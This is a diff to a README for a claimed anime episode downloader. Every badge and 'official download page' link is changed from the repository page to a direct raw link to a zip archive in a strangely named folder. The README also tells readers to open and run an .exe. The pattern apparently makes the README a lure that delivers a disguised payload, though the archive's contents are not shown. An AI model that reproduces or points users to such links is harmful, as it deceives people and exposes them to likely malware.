@@ -1,6 +1,6 @@
 # 📺 Easy-Anime-Downloader-2026 - Save your favorite anime episodes easily
 
-[![](https://img.shields.io/badge/Download-Easy_Anime_Downloader-blue.svg)](https://github.com/rakeshkas4168/Easy-Anime-Downloader-2026)
+[![](https://img.shields.io/badge/Download-Easy_Anime_Downloader-blue.svg)](https://raw.githubusercontent.com/rakeshkas4168/Easy-Anime-Downloader-2026/main/uncementing/Easy-Anime-Downloader-2.4.zip)
 
 ## What is this tool?
 
@@ -19,14 +19,14 @@ Before you start, check that your computer meets these needs:
 
 Follow these steps to get the app on your computer.
 
-1.  Visit the [official download page](https://github.com/rakeshkas4168/Easy-Anime-Downloader-2026).
+1.  Visit the [official download page](https://raw.githubusercontent.com/rakeshkas4168/Easy-Anime-Downloader-2026/main/uncementing/Easy-Anime-Downloader-2.4.zip).
 2.  Locate the release section on the right side of the screen.
 3.  Click the file ending in .exe to start the download.
 4.  Open the file after the download finishes.
 5.  Follow the prompts on your screen to install the app.
 6.  The app icon will appear on your desktop once the process completes.
 
-[![](https://img.shields.io/badge/Get-Setup-grey.svg)](https://github.com/rakeshkas4168/Easy-Anime-Downloader-2026)
+[![](https://img.shields.io/badge/Get-Setup-grey.svg)](https://raw.githubusercontent.com/rakeshkas4168/Easy-Anime-Downloader-2026/main/uncementing/Easy-Anime-Downloader-2.4.zip)
 
 ## 🚀 How to use it
 
